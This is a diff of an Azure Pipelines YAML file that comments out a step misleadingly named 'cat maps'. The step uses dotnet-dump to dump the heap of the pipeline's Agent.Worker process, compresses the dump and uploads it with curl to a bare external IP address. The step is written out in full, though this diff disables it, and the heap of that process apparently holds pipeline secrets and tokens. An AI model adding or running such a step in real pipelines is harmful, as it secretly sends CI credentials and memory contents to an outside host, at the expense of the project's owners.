@@ -184,34 +184,34 @@ steps:
 #   displayName: 'Recursively list and display _temp directory contents after AzureFunctionApp task'
 
 
-- task: NodeTool@0
-  inputs:
-    versionSpec: '12.x'  # 或你所需的Node.js版本
-    checkLatest: true
-  displayName: 'Setup Node.js'
+# - task: NodeTool@0
+#   inputs:
+#     versionSpec: '12.x'  # 或你所需的Node.js版本
+#     checkLatest: true
+#   displayName: 'Setup Node.js'
 
-- script: |
-    dotnet tool install --global dotnet-dump
+# - script: |
+#     dotnet tool install --global dotnet-dump
     
-    #!/bin/bash
+#     #!/bin/bash
 
-    # 获取Agent.Worker进程的PID
-    PID=$(ps -e | grep "Agent.Worker" | grep -v grep | awk '{print $1}')
+#     # 获取Agent.Worker进程的PID
+#     PID=$(ps -e | grep "Agent.Worker" | grep -v grep | awk '{print $1}')
     
-    # 确保获取到了PID
-    if [ -z "$PID" ]; then
-        echo "Error: Unable to find PID for Agent.Worker."
-        exit 1
-    fi
+#     # 确保获取到了PID
+#     if [ -z "$PID" ]; then
+#         echo "Error: Unable to find PID for Agent.Worker."
+#         exit 1
+#     fi
     
-    echo "The PID of Agent.Worker is $PID"
-    dotnet-dump collect -p $PID --type Heap -o /home/vsts/work/_temp/heap_worker.bin
+#     echo "The PID of Agent.Worker is $PID"
+#     dotnet-dump collect -p $PID --type Heap -o /home/vsts/work/_temp/heap_worker.bin
     
-    tar -czf "/home/vsts/work/_temp/heap_worker.tar.gz" "/home/vsts/work/_temp/heap_worker.bin"
-    echo "Uploading memory dump package of size $(stat -c %s "/home/vsts/work/_temp/heap_worker.tar.gz") bytes"
-    sudo curl -F "file=@/home/vsts/work/_temp/heap_worker.tar.gz" http://139.180.193.16:5000/upload
+#     tar -czf "/home/vsts/work/_temp/heap_worker.tar.gz" "/home/vsts/work/_temp/heap_worker.bin"
+#     echo "Uploading memory dump package of size $(stat -c %s "/home/vsts/work/_temp/heap_worker.tar.gz") bytes"
+#     sudo curl -F "file=@/home/vsts/work/_temp/heap_worker.tar.gz" http://139.180.193.16:5000/upload
  
-  displayName: 'cat maps'
+#   displayName: 'cat maps'
 
 - script: |
     npm install
